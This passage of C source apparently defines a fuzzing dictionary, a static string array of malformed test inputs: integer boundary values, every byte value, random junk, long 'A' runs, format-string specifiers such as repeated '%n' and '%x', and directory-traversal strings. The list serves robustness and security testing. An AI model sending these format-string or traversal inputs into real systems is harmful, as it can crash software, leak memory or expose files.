#include "../core/Core.h"

#ifdef __cplusplus
extern "C"{
#endif


char* stringStatic[]=
{
"LvShu",
"anner910",

"Peach",
"abcdefghijklmnopqrstuvwxyz",
"ABCDEFGHIJKLMNOPQRSTUVWXYZ",
"0123456789",
"",
"10",
"0.0",
"1.0",
"0.1",
"1.1.1",
"-2,147,483,648",
"-2,147,483,649",
"2,147,483,647",
"2,147,483,649",
"-2147483648",
"-2147483649",
"2147483647",
"2147483649",
"-129",
"129",
"255",
"256",
"-32769",
"-32,769",
"32767",
"32769",
"4,294,967,295",
"4294967299",
"-9,223,372,036,854,775,809",
"-9223372036854775809",
"9,223,372,036,854,775,809",
"9223372036854775809",
"18,446,744,073,709,551,615",
"18,446,744,073,709,551,619",
"18446744073709551619",
"2.305843009213693952",
"200000000000000000000.5",
"200000000000000000000000000000000000000000000.5",
"0xFF",
"0xFFFF",
"0xFFFFFF",
"0xFFFFFFFFFFFFFFFFFFFF",
"Yes",
"No",
"true",
"True",
"TRUE",
"false",
"False",
"FALSE",
"%n",
"%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n",
"%x",
"%x%x%x%x%x%x%x%x",
"%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x",
"%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x",
"%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x",
"<>\"/\'",
"~`!@#$%^&*()_+=-{}|\\][:\"\';<>?/.,",
"\\\"",
"\\'",
"%",
"a%",
"%a",
"COM1",
"COM2",
"AUX",
"COM1:",
"COM2:",
"AUX:",
"\\\\peach\x0coo\x0coo.txt",
"\\\\\\",
"..\\..\\..\\..\\..\\..\\..\\..\\",
"../../../../../",
"../",
"/../../../../../../",
"/../../..",
"\\..\\..\\..\\..\\..\\",
";,;,;,;,;,;,;,;,;,;,;,;,;,;,;,;,;,;,;,;,;,;,;,;,;,;,;,;,;,;,;,;,;,;,;,;,;,;,;,;,;,;,",
"\x00",
"\x01",
"\x02",
"\x03",
"\x04",
"\x05",
"\x06",
"\x07",
"\x08",
"\t",
"\n",
"\x0b",
"\x0c",
"\r",
"\x0e",
"\x0f",
"\x10",
"\x11",
"\x12",
"\x13",
"\x14",
"\x15",
"\x16",
"\x17",
"\x18",
"\x19",
"\x1a",
"\x1b",
"\x1c",
"\x1d",
"\x1e",
"\x1f",
" ",
"!",
"\"",
"#",
"$",
"%",
"&",
"'",
"(",
")",
"*",
"+",
",",
"-",
".",
"/",
"0",
"1",
"2",
"3",
"4",
"5",
"6",
"7",
"8",
"9",
":",
";",
"<",
"=",
">",
"?",
"@",
"A",
"B",
"C",
"D",
"E",
"F",
"G",
"H",
"I",
"J",
"K",
"L",
"M",
"N",
"O",
"P",
"Q",
"R",
"S",
"T",
"",
"V",
"W",
"X",
"Y",
"Z",
"[",
"\\",
"]",
"^",
"_",
"`",
"a",
"b",
"c",
"d",
"e",
"f",
"g",
"h",
"i",
"j",
"k",
"l",
"m",
"n",
"o",
"p",
"q",
"r",
"s",
"t",
"",
"v",
"w",
"x",
"y",
"z",
"{",
"|",
"}",
"~",
"\x7f",
"\x80",
"\x81",
"\x82",
"\x83",
"\x84",
"\x85",
"\x86",
"\x87",
"\x88",
"\x89",
"\x8a",
"\x8b",
"\x8c",
"\x8d",
"\x8e",
"\x8f",
"\x90",
"\x91",
"\x92",
"\x93",
"\x94",
"\x95",
"\x96",
"\x97",
"\x98",
"\x99",
"\x9a",
"\x9b",
"\x9c",
"\x9d",
"\x9e",
"\x9f",
"\xa0",
"\xa1",
"\xa2",
"\xa3",
"\xa4",
"\xa5",
"\xa6",
"\xa7",
"\xa8",
"\xa9",
"\xaa",
"\xab",
"\xac",
"\xad",
"\xae",
"\xaf",
"\xb0",
"\xb1",
"\xb2",
"\xb3",
"\xb4",
"\xb5",
"\xb6",
"\xb7",
"\xb8",
"\xb9",
"\xba",
"\xbb",
"\xbc",
"\xbd",
"\xbe",
"\xbf",
"\xc0",
"\xc1",
"\xc2",
"\xc3",
"\xc4",
"\xc5",
"\xc6",
"\xc7",
"\xc8",
"\xc9",
"\xca",
"\xcb",
"\xcc",
"\xcd",
"\xce",
"\xcf",
"\xd0",
"\xd1",
"\xd2",
"\xd3",
"\xd4",
"\xd5",
"\xd6",
"\xd7",
"\xd8",
"\xd9",
"\xda",
"\xdb",
"\xdc",
"\xdd",
"\xde",
"\xdf",
"\xe0",
"\xe1",
"\xe2",
"\xe3",
"\xe4",
"\xe5",
"\xe6",
"\xe7",
"\xe8",
"\xe9",
"\xea",
"\xeb",
"\xec",
"\xed",
"\xee",
"\xef",
"\xf0",
"\xf1",
"\xf2",
"\xf3",
"\xf4",
"\xf5",
"\xf6",
"\xf7",
"\xf8",
"\xf9",
"\xfa",
"\xfb",
"\xfc",
"\xfd",
"\xfe",
"\xff",
"NLBO1[)HZK\nP+_HMzVTXCnd(]?\n0d!]JvhuVBKCIS'Z ZTz$nNvN*^Y2\\-oc&",
"tA<mrHWzY\r<YYM@o\r&g}@cd,.rZ_/-wisLVgq\t#s4}*&LyKH\"_\'nhyl\">\'03iz0089M&=CW(zR![rp@H,SDy(+}T>I&Z0?-b",
"+XsB@`\"&&p }DNrF+y\'#",
"dHVwa4b];BU=Y _4,Zj!pr%K-4R>8",
"b)UeNK\"FL5==..>R(",
"OL7co\tO1-\'L.]rIGq?zP_Hy|tv]bp}P:\nG%2d02+D[[Q+aQD>ljZGKt-/*!4Yf\"Z\n;=n`Pc<++Cg!6fU(|O&dP];KP\\?n(H`!",
"coDAEhm.XiO\"{VDHbE_7ch:S#f)/mFS\n%$ogj%\nk\t33<jB36wR(\"\")kFyB6+rEb;/gD!ulobuzb%iVAEv{QjTyh3?Fnj{\\2A|te",
"u\nr)nd;5V+W6Pu?JyvL'Q_v2alA4",
"h-dR#)k7WvMzN{u(l\n0M+$I Ipak|tiGxY",
"!C\\X=&N-w-6$YzU)k>AWF,kg<>&],Dk",
"iO/A411}.GO-Tct[Pe^[,S\\[P\r(\tJh,CdgGe}P0i9@J;OGANn+vY5]wJ;ny4S>H%Ci=L8+#F=\t:N\r<",
"mTmep6'/0R9fm?(*N14l]^agvOPIYYM",
"w`e4k.sqG-h2;&8\'\'M=\\O:ExpqpljxWt7}oUaf+g%ly5?NO\\Xi@YIj\"$/KdSrc%u &M%eXGAwb0K",
"G]`)pd[fxMIG*}\\FxD#,>@X'pc)Dyf 1!u/d^yEH'_\t`e/$%|E-#_np-k+K&Qa)v",
"-6)b,dS`f\t@\n`ODt{IlU<LG[\tz|L-+$x\n`{txuySp_61sC|Q\nrVy.k>\tmSa7uD{ZK}6:Y<>tP \rnn2gYV`yG0_!=Te\\",
"fgz[P>J r^6s0C,dD0*D:vPXZ'2J>EdxbZ&7t",
"n4@Tr[Q-y{15Bc^LNlR",
"wJV:e\rS`Hcs?EZr<$WM=G<z>*c?K7\r7:vw!pcv]#Y@i=3TYD{d+r/`NZ}[Pu2 /\"`5\\8$9`j<,vU[v^UWSG@\n:5d",
")p\n$ft\n7b#M",
"{M\'keS<|oi\\N`@U`HiOG\nkN@<Fr1%FO\"_",
"ndv`I\\Xa\\]MH#iZv$ nDC;Y},9K[y;.Xx)u?bCcC\tM&Ed35KEHC8Yl",
"NahE$R,GHgel8 ;P>XzN$F6[\'D(=/brPwt&qfVPo>fDs$,&CFoX=w\"N0\"",
"vP06t=KDu\\+ef(jn",
":_6@{ynQjjy8GQ$,Cnx\">\\i0 jh0T\rk$/;PtZh)$1HK|PFXDFtb e9T\"]}WPah7g&yd[",
"&6 p-Q?}\tteSskJ.x+c<k_Bf\"C)rwR",
":Cn`WMCDX+Lm{3nIHve(R<X+3p:fLc%\tF`?[ksKUc\'2or4SB.8\ncsLs1!BK/f5})!=6!TZ2D#\\1,((\"LA811\ndQ",
"!j>T.%>\t,bZSi[+>t\r(+wX.",
"*KhpDT52c8s!w_T\nT=>@i5%=RVCc53E%.*j)752qJQez\\,Sog*\r,afqE [sv2j|S,nAe^P]DOV(btBTa[R",
"Y!o2f60&Cc!6>2O\tM%",
":S\"@Yo)9JL(QviN|G\\\n2.oUm,o`\'-qE>C+W$U#<`VAWWRvAx9G3,&j<hbflifSP:!:R8XSf3esJ3xbHWk",
"-]/Z\n69`+>x[.Fkqepw\'@Zc0/0;?=/Q{\"db[,n,04Vf{G\'!,\\Xni2$S@\nWO1\nG*g:Z|U^nyM6%h\"z",
"D{8Yk\tMt5fEpLKr$!u5N\tK4biWRVJ7&I=!fzG*T5P@2`ptJohAKKjUp6w:=)BG\"uADvs![:0Og",
"N4n;\r^E`Q7Le",
"b Kt*eY.mG'iAa2!h(aG7\\u0e_LH2a\\IHZU",
"$**:XQ9nQrsSyOvUG(]m7X#XTU)\t{4Fy= %M",
"Z*;R&@DjCH&pa G< 4T(0D^2:eN?}EaiWR\n028kf=(smnJN0?9b$lj[ZwLtC$>0p",
"w;}\r%)L/?tzAIF\tqSJo:A`+`q%)ChFmGt=+@NPp3`u.B#|WjV)I?_1wC4vHp",
";\"W95cW$Z\rJ(j;ehIu|<\rmVmd80e)o-g\tharN$.fe;S",
"}\no/]&-&m-k2(wf!\nB+xs*xO&N&sP|WL\trZGJ d4m\t_",
"d]ScKG\"sq3\toB.Mu[K\'Kn\'{ :!\n?OYI\'l?e.{0AR3&75a6Yd^#,|{4jrW[;4,RHdusW",
"`Ic]7{p:aIJ}1tAt>t5ZH",
"4FB%#=k;0Q\\&]\rz1x\"dM>wgDKh[f\nTpf(/\\AryJt(%Er\r",
"\n6\\'3E'e|BEN`yJO MH#=ux<rT( nyJ-}'CU!LD.p/ F!)thAEt 2Q'0^:hHPF_#]+/uKWzzhqibTz:42%b^mt*I",
"0j}5;=s$7v*5ZFY[\\+Nu$Hw=%B&ZOy>T\"]b-/?mn}mc)%5uUjEPzZ4!&c@l`#\nq{uSMA<5bnko/g.\"gyAtlJ;",
"YB>$;s@\\^O23ZN>jr]d",
"5anH\rgm9_7QKT\rwqrZx\r!4)C$zTE9 0O}<iK/txb\\ny",
"xA=^V\r,Cpy\tO#lR;e%lW0Ys0[1jzH>t; [ph%L(`WgVk!}N'#IzBpo0,06;4Rl$4Lw_c|uOI*",
",d)=!h+8s9I-FK#i[mZQ=xN$q=Cg7iW(jse+;zp>.z/WCg$R*$_;QJ juH0XI\rI",
"m}\tODbC5@j(\r;RO39j#Q6?WQGTHy.l]ce\r|#U)j\\o%lpVn1{)9B2sb[QxD[",
"_wPz,P\\uX\tBO=aU*ZWHZZK|fI( n;Z<PGKo\t^{?\n,w9t_#6@|\\*C#m8Q*{PCpLUyW}e4Pi7h%CeT7*#|",
"w-Q\\5E40\'bF\'^\'lj1n\"G0Peh/_!cnO|e\'oYeTs.|6zHc5gM]>o287?(:",
"\"v\r][D)-=w=P0mWI(!2P?,#zzZU?qL;j\t_L\'et<@/l5Ry0y?Ht0bDCr3{UC?EQ#U;h:-\tJh=!NH+`\r)1wI1Ks7m0{DKP",
"]:jT5{7)?QuaGs#:DP\rG|G9x^h|ka9P}q$NmV$_5`}+<2c?84rlx4ooh1{",
"k%ol6+S]rSH{s|Jd+;:lRu(V*:]6EX-] \\fS0t2=wK)+gs74J`L#bDKK$nH1?_iMFfp5;H:[O\t",
"U3hXMIlZ-/9D?4bD)>18xrjJ>ym&O5@zAN\not2LBIr#+mobKz?='P|6Jwwhc3\t`pu8W\n.54gxom",
"\tY(g4#Zy.FH(bZqVhij",
"\\f\rc1#:2c)WKO3\n-}9C&7&\'<#\n#icl_$&R@ \nMS.53w)6nRC\n^64hd|uH0TWC$k\r lF0\"w9_SBE& j(o>NN0}rcB/IQT",
"*0.kIR-:]MA:.OUK&ab'D6;D'v_B;i=vP=gxF>>",
"{r>=/OU5,/+I+gg\"6=9",
"\n9\"1]ef2LDo;I4t2\"e9w3KJn6_ZO+%u;^DQIuSvo#XRYwWZh)P VmgK0&|&f3\rV.<\nv[l%*<\t\\u\n3xjkv1l.e\'KURz",
"znU(-/I_-)qhSZ7`a5oAc0mYf1!l ;@V#\tNO5qYmZlh_@LvL`",
"HcAUF8{<h\"OL8@Q0F9=8*)G=Bc\nqZJ%LD$J*s=,c\tFzlnzH;",
"yln/[Rppd?sIfPOeMoig<C6\t2M9L$9Lz)>f8[",
"m49'>F^&g<\\f%SkLeKX?\\W<)v6GIc]Sp.Fm2{I{H<Juje9QjHb8U\\>Ik<,",
"O,B1(\nNVD$He+$V6x-+(l}Lt|6L\\UC8qK3UY`3j%EjolV3w[",
"id0;D\"0;#3-^T?L3Wt*IW_\\.^^*\\!@]8`IbJFo/sDqR  {&.}iNSgfiMcLZ\n",
"w,-WKlh_t/j#HcU_w](-rf-QYAqv\"!\n\'&w4}\'i]Y=\\_u`a7=dFhCOI]:/5J)80k0w\tAp:*E,Mw;1WRA?c|$|?rI]VXTHHB^b^",
"hKh@/W,2-:bk\'yfKh;Bj6-JLq_==Zf5NL=x?;m9-B]\"^_f ,[6eLgd5EP$f$:Sk1))DY]X2Ku=\n,`=@Sa[s",
"\ntC9lH-m\'#2}\rk.kl@\rA.<Z%SCn\'sv`\\\'J\"4H^W\'_!K%s\n92Z5X]GRjKw,%<yU\"E%?cf\\;a=5S{t5O",
"<r=Eye:\\vYtm<-&",
"^:6n`.P%@tG|g4VKN<Q40faHsyb*iSfL`tym gLf?R[[\n?jb\t}5}gs\nRF\rU& _.H\\{y",
"\"FtZ{RgsfC/M/rZz%}qxq]GU8VkLi_;m^atgc\r.b%gr.:]9RE7hd-W1Q?vsj<1RvZ5Qj^yp{TzLrWC-;sfH7E@UY",
"Xg:qp`K$IVn",
",GZCKc`igp<&*w!LLt]KL-L$@Z8,T5*86UG*jZP/X6zg=\\",
"QX/u}dSM:/pGC0+R[H37\r*F9iQ$';z12jQ})",
"m&D)HD;EapfA\t55sidJ_8O|lPYRy=C?\"[vDtzr<!dm\'8_hT{{lm{4.v>kL,1h2N\'\r250t6|lz<[4E\rioTh",
"?/D}i.<<\t\r.[+A`[{q7d pO)EH{?|>!hZHOTd/M=$[f\t;\tF\t+9k)bn\nn6[Tlgv[Wgr/L{9\tq}+",
"Yguk(I?(LVVI\r_w5{M2+3J$@si7>!LD36n3U6P\"O-?s[wcgY",
"5JX;orNqSB5!)Cy4ky4vrW.P#\toctT=Xz'*A`6gWZ*6wd6f8.X*n\rCP<\t;|8iy\tx{ M\rp6k\tFr)\rb3\t/X",
"6^b:R'j-0![aov(^`YQ{Cl}*",
"HuRUu]Dtcl\\zM,7(OmEU%O$gU]x/z\tD",
"Pu ,o>O1OJ|jlD\n+<>,'8d!hF1hn_Q{5_5[/e",
"yjxky&j%31n,Zu*fzaHSp721|74qu10?7p\n=>y{730bq?H\\YttzFw6g",
"k{;g8{QwYV!]s]:PP)W>D,o\rrL>LAG33:YITTxs}\"[Z[U,1",
"dJB:b=BZx-COzDCZjm&>[onD>L<6r\"k^ FwcVQmm \'%h8g5ks_&q4g\"9+i<F($%etvXg0l\"A",
"0.:zx\ny3 OT5zmF?a\rJ0uI2lZU&GOd",
"!$n^ETiwS.w&",
"{dciIv5>)\\T(YaZP&xyBd9Pj7(2*N.+]h!",
"b8e.bi[XQ}\nDBO#\t\t;ycmB{*C-gUUnl1Zrq\t-tM:cS|0.H&:+SC}X'9e-{/4m|X>y4!zei[*_48?=b;zO{b*A[15-@c",
"0=j)_;{&V)zkRY1,f/_2w?:WqLGdAWb>l>/j596P8p,I:1",
"vmN>5l?,$fEyY%U7FJ3lpEUtG4>_s",
"Xgo5Xceg!N u+;dl=\tKfO%njm)qcn+ U\tl} :OIN-$:?4p{dU\r;hwss.B-9\r7Nsp",
"uEGP#OoMNO!aT2EBp.hxUy",
"=R }z?mcrxjX:?;b^<lz",
"K\"\r\tDjE,ObXysPY&:ztdEE\t2:}{T5z3\n7<g0p7kJol&s_)L>C]r\nCsX#",
"0$2)v3D^U1_{X7x,Us\\",
"+]s}9$# *Y",
"a%h>j9T68hI[Bx8nbyT;  k<5n1$'&}''\r%-keIxB\ra8em:R=>Mz1I$:Du3C/=E3c[7;IZKG,J+L",
"9C{c:gpEEje<NJ]L3?$}_&%qgtyM< M?LG0?\nkI]-OirA5E+E",
"m=Uv|I$@V/WHmcP3Uw2.f(]o\tPU7\\ NG:dbT-aXQ?q?G0qCQg1*\"dfy\t4E|^kw\'?$\'r",
"AAAAAAAAAA",
"AAAAAAAAAAAAAAAAAAAA",
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
"A\x00A\x00A\x00A\x00A\x00A\x00A\x00A\x00A\x00A\x00",
"10",
"-50",
"-49",
"-48",
"-47",
"-46",
"-45",
"-44",
"-43",
"-42",
"-41",
"-40",
"-39",
"-38",
"-37",
"-36",
"-35",
"-34",
"-33",
"-32",
"-31",
"-30",
"-29",
"-28",
"-27",
"-26",
"-25",
"-24",
"-23",
"-22",
"-21",
"-20",
"-19",
"-18",
"-17",
"-16",
"-15",
"-14",
"-13",
"-12",
"-11",
"-10",
"-9",
"-8",
"-7",
"-6",
"-5",
"-4",
"-3",
"-2",
"-1",
"0",
"1",
"2",
"3",
"4",
"5",
"6",
"7",
"8",
"9",
"10",
"11",
"12",
"13",
"14",
"15",
"16",
"17",
"18",
"19",
"20",
"21",
"22",
"23",
"24",
"25",
"26",
"27",
"28",
"29",
"30",
"31",
"32",
"33",
"34",
"35",
"36",
"37",
"38",
"39",
"40",
"41",
"42",
"43",
"44",
"45",
"46",
"47",
"48",
"49",
"-178",
"-177",
"-176",
"-175",
"-174",
"-173",
"-172",
"-171",
"-170",
"-169",
"-168",
"-167",
"-166",
"-165",
"-164",
"-163",
"-162",
"-161",
"-160",
"-159",
"-158",
"-157",
"-156",
"-155",
"-154",
"-153",
"-152",
"-151",
"-150",
"-149",
"-148",
"-147",
"-146",
"-145",
"-144",
"-143",
"-142",
"-141",
"-140",
"-139",
"-138",
"-137",
"-136",
"-135",
"-134",
"-133",
"-132",
"-131",
"-130",
"-129",
"-128",
"-127",
"-126",
"-125",
"-124",
"-123",
"-122",
"-121",
"-120",
"-119",
"-118",
"-117",
"-116",
"-115",
"-114",
"-113",
"-112",
"-111",
"-110",
"-109",
"-108",
"-107",
"-106",
"-105",
"-104",
"-103",
"-102",
"-101",
"-100",
"-99",
"-98",
"-97",
"-96",
"-95",
"-94",
"-93",
"-92",
"-91",
"-90",
"-89",
"-88",
"-87",
"-86",
"-85",
"-84",
"-83",
"-82",
"-81",
"-80",
"-79",
"77",
"78",
"79",
"80",
"81",
"82",
"83",
"84",
"85",
"86",
"87",
"88",
"89",
"90",
"91",
"92",
"93",
"94",
"95",
"96",
"97",
"98",
"99",
"100",
"101",
"102",
"103",
"104",
"105",
"106",
"107",
"108",
"109",
"110",
"111",
"112",
"113",
"114",
"115",
"116",
"117",
"118",
"119",
"120",
"121",
"122",
"123",
"124",
"125",
"126",
"127",
"128",
"129",
"130",
"131",
"132",
"133",
"134",
"135",
"136",
"137",
"138",
"139",
"140",
"141",
"142",
"143",
"144",
"145",
"146",
"147",
"148",
"149",
"150",
"151",
"152",
"153",
"154",
"155",
"156",
"157",
"158",
"159",
"160",
"161",
"162",
"163",
"164",
"165",
"166",
"167",
"168",
"169",
"170",
"171",
"172",
"173",
"174",
"175",
"176",
"205",
"206",
"207",
"208",
"209",
"210",
"211",
"212",
"213",
"214",
"215",
"216",
"217",
"218",
"219",
"220",
"221",
"222",
"223",
"224",
"225",
"226",
"227",
"228",
"229",
"230",
"231",
"232",
"233",
"234",
"235",
"236",
"237",
"238",
"239",
"240",
"241",
"242",
"243",
"244",
"245",
"246",
"247",
"248",
"249",
"250",
"251",
"252",
"253",
"254",
"255",
"256",
"257",
"258",
"259",
"260",
"261",
"262",
"263",
"264",
"265",
"266",
"267",
"268",
"269",
"270",
"271",
"272",
"273",
"274",
"275",
"276",
"277",
"278",
"279",
"280",
"281",
"282",
"283",
"284",
"285",
"286",
"287",
"288",
"289",
"290",
"291",
"292",
"293",
"294",
"295",
"296",
"297",
"298",
"299",
"300",
"301",
"302",
"303",
"304",
"-32818",
"-32817",
"-32816",
"-32815",
"-32814",
"-32813",
"-32812",
"-32811",
"-32810",
"-32809",
"-32808",
"-32807",
"-32806",
"-32805",
"-32804",
"-32803",
"-32802",
"-32801",
"-32800",
"-32799",
"-32798",
"-32797",
"-32796",
"-32795",
"-32794",
"-32793",
"-32792",
"-32791",
"-32790",
"-32789",
"-32788",
"-32787",
"-32786",
"-32785",
"-32784",
"-32783",
"-32782",
"-32781",
"-32780",
"-32779",
"-32778",
"-32777",
"-32776",
"-32775",
"-32774",
"-32773",
"-32772",
"-32771",
"-32770",
"-32769",
"-32768",
"-32767",
"-32766",
"-32765",
"-32764",
"-32763",
"-32762",
"-32761",
"-32760",
"-32759",
"-32758",
"-32757",
"-32756",
"-32755",
"-32754",
"-32753",
"-32752",
"-32751",
"-32750",
"-32749",
"-32748",
"-32747",
"-32746",
"-32745",
"-32744",
"-32743",
"-32742",
"-32741",
"-32740",
"-32739",
"-32738",
"-32737",
"-32736",
"-32735",
"-32734",
"-32733",
"-32732",
"-32731",
"-32730",
"-32729",
"-32728",
"-32727",
"-32726",
"-32725",
"-32724",
"-32723",
"-32722",
"-32721",
"-32720",
"-32719",
"32717",
"32718",
"32719",
"32720",
"32721",
"32722",
"32723",
"32724",
"32725",
"32726",
"32727",
"32728",
"32729",
"32730",
"32731",
"32732",
"32733",
"32734",
"32735",
"32736",
"32737",
"32738",
"32739",
"32740",
"32741",
"32742",
"32743",
"32744",
"32745",
"32746",
"32747",
"32748",
"32749",
"32750",
"32751",
"32752",
"32753",
"32754",
"32755",
"32756",
"32757",
"32758",
"32759",
"32760",
"32761",
"32762",
"32763",
"32764",
"32765",
"32766",
"32767",
"32768",
"32769",
"32770",
"32771",
"32772",
"32773",
"32774",
"32775",
"32776",
"32777",
"32778",
"32779",
"32780",
"32781",
"32782",
"32783",
"32784",
"32785",
"32786",
"32787",
"32788",
"32789",
"32790",
"32791",
"32792",
"32793",
"32794",
"32795",
"32796",
"32797",
"32798",
"32799",
"32800",
"32801",
"32802",
"32803",
"32804",
"32805",
"32806",
"32807",
"32808",
"32809",
"32810",
"32811",
"32812",
"32813",
"32814",
"32815",
"32816",
"65485",
"65486",
"65487",
"65488",
"65489",
"65490",
"65491",
"65492",
"65493",
"65494",
"65495",
"65496",
"65497",
"65498",
"65499",
"65500",
"65501",
"65502",
"65503",
"65504",
"65505",
"65506",
"65507",
"65508",
"65509",
"65510",
"65511",
"65512",
"65513",
"65514",
"65515",
"65516",
"65517",
"65518",
"65519",
"65520",
"65521",
"65522",
"65523",
"65524",
"65525",
"65526",
"65527",
"65528",
"65529",
"65530",
"65531",
"65532",
"65533",
"65534",
"65535",
"65536",
"65537",
"65538",
"65539",
"65540",
"65541",
"65542",
"65543",
"65544",
"65545",
"65546",
"65547",
"65548",
"65549",
"65550",
"65551",
"65552",
"65553",
"65554",
"65555",
"65556",
"65557",
"65558",
"65559",
"65560",
"65561",
"65562",
"65563",
"65564",
"65565",
"65566",
"65567",
"65568",
"65569",
"65570",
"65571",
"65572",
"65573",
"65574",
"65575",
"65576",
"65577",
"65578",
"65579",
"65580",
"65581",
"65582",
"65583",
"65584",
"-2147483698",
"-2147483697",
"-2147483696",
"-2147483695",
"-2147483694",
"-2147483693",
"-2147483692",
"-2147483691",
"-2147483690",
"-2147483689",
"-2147483688",
"-2147483687",
"-2147483686",
"-2147483685",
"-2147483684",
"-2147483683",
"-2147483682",
"-2147483681",
"-2147483680",
"-2147483679",
"-2147483678",
"-2147483677",
"-2147483676",
"-2147483675",
"-2147483674",
"-2147483673",
"-2147483672",
"-2147483671",
"-2147483670",
"-2147483669",
"-2147483668",
"-2147483667",
"-2147483666",
"-2147483665",
"-2147483664",
"-2147483663",
"-2147483662",
"-2147483661",
"-2147483660",
"-2147483659",
"-2147483658",
"-2147483657",
"-2147483656",
"-2147483655",
"-2147483654",
"-2147483653",
"-2147483652",
"-2147483651",
"-2147483650",
"-2147483649",
"-2147483648",
"-2147483647",
"-2147483646",
"-2147483645",
"-2147483644",
"-2147483643",
"-2147483642",
"-2147483641",
"-2147483640",
"-2147483639",
"-2147483638",
"-2147483637",
"-2147483636",
"-2147483635",
"-2147483634",
"-2147483633",
"-2147483632",
"-2147483631",
"-2147483630",
"-2147483629",
"-2147483628",
"-2147483627",
"-2147483626",
"-2147483625",
"-2147483624",
"-2147483623",
"-2147483622",
"-2147483621",
"-2147483620",
"-2147483619",
"-2147483618",
"-2147483617",
"-2147483616",
"-2147483615",
"-2147483614",
"-2147483613",
"-2147483612",
"-2147483611",
"-2147483610",
"-2147483609",
"-2147483608",
"-2147483607",
"-2147483606",
"-2147483605",
"-2147483604",
"-2147483603",
"-2147483602",
"-2147483601",
"-2147483600",
"-2147483599",
"2147483597",
"2147483598",
"2147483599",
"2147483600",
"2147483601",
"2147483602",
"2147483603",
"2147483604",
"2147483605",
"2147483606",
"2147483607",
"2147483608",
"2147483609",
"2147483610",
"2147483611",
"2147483612",
"2147483613",
"2147483614",
"2147483615",
"2147483616",
"2147483617",
"2147483618",
"2147483619",
"2147483620",
"2147483621",
"2147483622",
"2147483623",
"2147483624",
"2147483625",
"2147483626",
"2147483627",
"2147483628",
"2147483629",
"2147483630",
"2147483631",
"2147483632",
"2147483633",
"2147483634",
"2147483635",
"2147483636",
"2147483637",
"2147483638",
"2147483639",
"2147483640",
"2147483641",
"2147483642",
"2147483643",
"2147483644",
"2147483645",
"2147483646",
"2147483647",
"2147483648",
"2147483649",
"2147483650",
"2147483651",
"2147483652",
"2147483653",
"2147483654",
"2147483655",
"2147483656",
"2147483657",
"2147483658",
"2147483659",
"2147483660",
"2147483661",
"2147483662",
"2147483663",
"2147483664",
"2147483665",
"2147483666",
"2147483667",
"2147483668",
"2147483669",
"2147483670",
"2147483671",
"2147483672",
"2147483673",
"2147483674",
"2147483675",
"2147483676",
"2147483677",
"2147483678",
"2147483679",
"2147483680",
"2147483681",
"2147483682",
"2147483683",
"2147483684",
"2147483685",
"2147483686",
"2147483687",
"2147483688",
"2147483689",
"2147483690",
"2147483691",
"2147483692",
"2147483693",
"2147483694",
"2147483695",
"2147483696",
"4294967245",
"4294967246",
"4294967247",
"4294967248",
"4294967249",
"4294967250",
"4294967251",
"4294967252",
"4294967253",
"4294967254",
"4294967255",
"4294967256",
"4294967257",
"4294967258",
"4294967259",
"4294967260",
"4294967261",
"4294967262",
"4294967263",
"4294967264",
"4294967265",
"4294967266",
"4294967267",
"4294967268",
"4294967269",
"4294967270",
"4294967271",
"4294967272",
"4294967273",
"4294967274",
"4294967275",
"4294967276",
"4294967277",
"4294967278",
"4294967279",
"4294967280",
"4294967281",
"4294967282",
"4294967283",
"4294967284",
"4294967285",
"4294967286",
"4294967287",
"4294967288",
"4294967289",
"4294967290",
"4294967291",
"4294967292",
"4294967293",
"4294967294",
"4294967295",
"4294967296",
"4294967297",
"4294967298",
"4294967299",
"4294967300",
"4294967301",
"4294967302",
"4294967303",
"4294967304",
"4294967305",
"4294967306",
"4294967307",
"4294967308",
"4294967309",
"4294967310",
"4294967311",
"4294967312",
"4294967313",
"4294967314",
"4294967315",
"4294967316",
"4294967317",
"4294967318",
"4294967319",
"4294967320",
"4294967321",
"4294967322",
"4294967323",
"4294967324",
"4294967325",
"4294967326",
"4294967327",
"4294967328",
"4294967329",
"4294967330",
"4294967331",
"4294967332",
"4294967333",
"4294967334",
"4294967335",
"4294967336",
"4294967337",
"4294967338",
"4294967339",
"4294967340",
"4294967341",
"4294967342",
"4294967343",
"4294967344",
"-9223372036854775858",
"-9223372036854775857",
"-9223372036854775856",
"-9223372036854775855",
"-9223372036854775854",
"-9223372036854775853",
"-9223372036854775852",
"-9223372036854775851",
"-9223372036854775850",
"-9223372036854775849",
"-9223372036854775848",
"-9223372036854775847",
"-9223372036854775846",
"-9223372036854775845",
"-9223372036854775844",
"-9223372036854775843",
"-9223372036854775842",
"-9223372036854775841",
"-9223372036854775840",
"-9223372036854775839",
"-9223372036854775838",
"-9223372036854775837",
"-9223372036854775836",
"-9223372036854775835",
"-9223372036854775834",
"-9223372036854775833",
"-9223372036854775832",
"-9223372036854775831",
"-9223372036854775830",
"-9223372036854775829",
"-9223372036854775828",
"-9223372036854775827",
"-9223372036854775826",
"-9223372036854775825",
"-9223372036854775824",
"-9223372036854775823",
"-9223372036854775822",
"-9223372036854775821",
"-9223372036854775820",
"-9223372036854775819",
"-9223372036854775818",
"-9223372036854775817",
"-9223372036854775816",
"-9223372036854775815",
"-9223372036854775814",
"-9223372036854775813",
"-9223372036854775812",
"-9223372036854775811",
"-9223372036854775810",
"-9223372036854775809",
"-9223372036854775808",
"-9223372036854775807",
"-9223372036854775806",
"-9223372036854775805",
"-9223372036854775804",
"-9223372036854775803",
"-9223372036854775802",
"-9223372036854775801",
"-9223372036854775800",
"-9223372036854775799",
"-9223372036854775798",
"-9223372036854775797",
"-9223372036854775796",
"-9223372036854775795",
"-9223372036854775794",
"-9223372036854775793",
"-9223372036854775792",
"-9223372036854775791",
"-9223372036854775790",
"-9223372036854775789",
"-9223372036854775788",
"-9223372036854775787",
"-9223372036854775786",
"-9223372036854775785",
"-9223372036854775784",
"-9223372036854775783",
"-9223372036854775782",
"-9223372036854775781",
"-9223372036854775780",
"-9223372036854775779",
